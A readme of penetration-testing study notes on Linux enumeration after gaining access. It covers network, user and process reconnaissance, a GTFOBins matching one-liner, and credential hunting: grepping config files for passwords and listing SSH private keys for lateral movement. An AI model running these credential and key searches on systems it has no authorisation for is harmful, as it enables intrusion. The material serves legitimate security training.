readme.md


<a id="org48a59ea"></a>

## Linux Services & Internals Enumeration


<a id="org40fe653"></a>

### Internal

At this time we'll also want to gather as much network information as possible.
When we talk about the `internals`, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks.

1.  `Network Interfaces`
    
        ip a

2.  `Hosts`
    
        cat /etc/hosts

3.  `User's Last Login`
    
        lastlog

4.  `Logged In Users`
    
        w

5.  `Command history`
    
        history

6.  `Finding History Files`
    Sometimes we can also find special history files created by scripts or programs. This can be found, among others,
    in scripts that monitor certain activities of users and check for suspicious activities.
    
        find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

7.  `Cron`
    
        ls -la /etc/cron.daily/

8.  `Proc`
    The **proc filesystem** (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system
    processes, hardware, and other system information. It is the primary way to access process information and can be
    used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically
    generated by the kernel. It can be used to look up system information such as the state of running processes,
    kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority,
    scheduling, and memory allocation.
    
        find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"


<a id="org025b189"></a>

### Services

If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.

1.  `Installed Packages`
    
        apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

2.  `Sudo Version`
    
        sudo -V

3.  `Binaries`
    
        ls -l /bin /usr/bin/ /usr/sbin/

4.  `GTOFbins`
    the [GTOFbins](https://gtfobins.github.io/) provides an excellent platform that includes a list of binaries that can potentially be exploited to
    escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with
    the ones from GTFObins to see which binaries we should investigate later.
    
        for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

5.  `Strace tool (sys call)`
    We can use the diagnostic tool strace on Linux-based operating systems to track and analyze system calls and
    signal processing. It allows us to follow the flow of a program and understand how it accesses system resources,
    processes signals, and receives and sends data from the operating system. In addition, we can also use the tool to
    monitor security-related activities and identify potential attack vectors, such as specific requests to remote
    hosts using passwords or tokens.
    
    The output of strace can be written to a file for later analysis, and it provides a wealth of options that allow
    detailed monitoring of the program's behavior.
    
        strace ping -c1 10.129.112.20

6.  `Configuration Files`
    Users can read almost all configuration files on a Linux operating system if the administrator has kept them the
    same. These configuration files can often reveal how the service is set up and configured to understand better how
    we can use it for our purposes.
    
        find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

7.  Search `scripts`
    
        find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

8.  Running `Services` by `User`
    Also, if we look at the process list, it can give us information about which scripts or binaries are in use and by
    which user. So, for example, if it is a script created by the administrator in his path and whose rights have not
    been restricted, we can run it without going into the root directory.
    
        ps aux | grep <user>

9.  Find `version of a Softwer`
    For exemple Python
    
        whereis python3
        ls -ls /usr/bin/python*
        compgen -c python | grep -P '^python\d'
        find /usr/bin/python* ! -type l


<a id="org33d6e1b"></a>

## Credentials Hunting

When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files:

    cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
    
    define( 'DB_USER', 'wordpressuser' );
    define( 'DB_PASSWORD', 'WPadmin123!' );

The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

    find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
    
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /etc/python3/debian_config
    /etc/kbd/config
    /etc/manpath.config
    /boot/config-4.4.0-116-generic
    /boot/grub/i386-pc/configfile.mod
    /sys/devices/pci0000:00/0000:00:00.0/config
    /sys/devices/pci0000:00/0000:00:01.0/config

    grep -ri password


<a id="orge837cff"></a>

### SSH Keys

It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the known<sub>hosts</sub> file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.

    ls ~/.ssh
    
    id_rsa  id_rsa.pub  known_hosts


<a id="orgfe8f8ee"></a>

# Environment-based Privilege Escalation
